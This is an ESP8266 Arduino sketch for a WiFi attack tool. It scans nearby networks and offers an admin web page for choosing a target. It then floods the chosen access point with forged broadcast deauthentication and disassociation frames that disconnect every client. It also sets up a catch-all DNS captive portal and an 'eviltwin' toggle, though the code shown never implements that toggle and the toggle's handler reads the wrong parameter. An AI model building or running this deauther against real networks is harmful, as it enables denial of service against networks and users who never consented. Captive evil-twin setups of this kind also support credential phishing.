#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESPAsyncDNSServer.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <ArduinoJson.h>

#include "admin_web_content.h"
#include "client_web_content.h"

// Configurable start
String wifiName = "WiFi Tool";
String wifiPass = "12345678";
bool isHidden = false;

const int scanInterval = 15000;
int pktSendGap = 100;
// Configurable end

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

_Network _networks[16];
_Network _selectedNetwork;

AsyncDNSServer dnsServer;
AsyncWebServer server(80);

bool statusDeauth = false;
bool statusEvilTwin = false;
bool isNetworkSelected = false;

bool isScanning = false;
unsigned long lastScanTime = 0;



void setup() {
  Serial.begin(115200);

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(wifiName, wifiPass, 0, isHidden);

  dnsServer.setTTL(300);
  dnsServer.setErrorReplyCode(AsyncDNSReplyCode::ServerFailure);
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  server.on("/", HTTP_GET, handleClient);
  server.on("/admin", HTTP_GET, handleAdmin);

  server.on("/style.css", HTTP_GET, handleStyle);
  server.on("/script.js", HTTP_GET, handleScript);

  server.on("/api", HTTP_POST, handleAPI);

  server.onNotFound(handleClient);
  server.begin();

  startScan();
}


void handleClient(AsyncWebServerRequest* req) {
  req->send_P(200, "text/html", client_html);
}
void handleAdmin(AsyncWebServerRequest* req) {
  req->send_P(200, "text/html", admin_html);
}
void handleStyle(AsyncWebServerRequest* req) {
  if (req->hasParam("admin")) {
    req->send_P(200, "text/css; charset=utf-8", admin_css);
  } else {
    req->send_P(200, "text/css; charset=utf-8", client_css);
  }
}
void handleScript(AsyncWebServerRequest* req) {
  if (req->hasParam("admin")) {
    req->send_P(200, "application/javascript; charset=utf-8", admin_js);
  } else {
    req->send_P(200, "application/javascript; charset=utf-8", client_js);
  }
}

void handleAPI(AsyncWebServerRequest* req) {

  // Deauth
  if (req->hasParam("deauth", true)) {
    String value = req->getParam("deauth", true)->value();
    if (value == "true") {
      statusDeauth = true;
    } else if (value == "false") {
      statusDeauth = false;
    }
    req->send(200, "text/plain", "true");
    return;
  }

  // EvilTwin
  if (req->hasParam("eviltwin", true)) {
    String value = req->getParam("deauth", true)->value();
    if (value == "true") {
      statusEvilTwin = true;
    } else if (value == "false") {
      statusEvilTwin = false;
    }
    req->send(200, "text/plain", "true");
    return;
  }

  // Mac
  if (req->hasParam("mac", true)) {
    String selectAp = req->getParam("mac", true)->value();
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == selectAp) {
        _selectedNetwork = _networks[i];
        isNetworkSelected = true;
        break;
      }
    }
    req->send(200, "text/plain", selectAp);
    return;
  }

  // List
  if (req->hasParam("list", true)) {
    StaticJsonDocument<1024> doc;
    JsonArray arr = doc.to<JsonArray>();
    String selectedBssid = bytesToStr(_selectedNetwork.bssid, 6);
    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") continue;
      String netBssid = bytesToStr(_networks[i].bssid, 6);
      // JsonObject obj = arr.createNestedObject();
      JsonObject obj = arr.add<JsonObject>();
      obj["ssid"] = _networks[i].ssid;
      obj["bssid"] = netBssid;
      obj["channel"] = _networks[i].ch;
      obj["isSelected"] = (selectedBssid == netBssid);
    }
    String response;
    serializeJson(doc, response);
    req->send(200, "application/json", response);
    return;
  }

  // Update
  if (req->hasParam("update", true)) {
    StaticJsonDocument<200> doc;
    doc["deauth"] = statusDeauth;
    doc["eviltwin"] = statusEvilTwin;
    doc["net_selected"] = isNetworkSelected;
    String response;
    serializeJson(doc, response);
    req->send(200, "application/json", response);
    return;
  }

  req->send(404, "text/plain", "false");
}

// =================================================
void clearArray() {
  for (int i = 0; i < 16; i++) {
    _networks[i].ssid = "";
    _networks[i].ch = 0;
    memset(_networks[i].bssid, 0, sizeof(_networks[i].bssid));
  }
}
void startScan() {
  if (!isScanning) {
    isScanning = true;
    WiFi.scanNetworks(true);  // asynchronous
  }
}
void checkScanDone() {
  int n = WiFi.scanComplete();
  if (n == -1) {
    return;
  }
  if (n >= 0) {
    clearArray();
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
  WiFi.scanDelete();  // clean up memory
  isScanning = false;
  lastScanTime = millis();
}
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    String hexStr = String(b[i], HEX);
    hexStr.toUpperCase();
    str += hexStr;
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}
// =================================================

// Deauther part=======================================================
unsigned long deauth_now = 0;
uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
void sendDeauthPkt() {
  wifi_set_channel(_selectedNetwork.ch);
  uint8_t deauthPacket[26] = { 0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00 };
  memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
  memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
  deauthPacket[24] = 1;
  deauthPacket[0] = 0xC0;
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
  deauthPacket[0] = 0xA0;
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
  deauth_now = millis();
}
// Deauther part=======================================================

unsigned long now = 0;
void loop() {
  checkScanDone();

  if (!isScanning && millis() - lastScanTime >= scanInterval) {
    startScan();
  }

  if (statusDeauth && isNetworkSelected && millis() - deauth_now >= (1000 / pktSendGap)) {
    sendDeauthPkt();
  }
}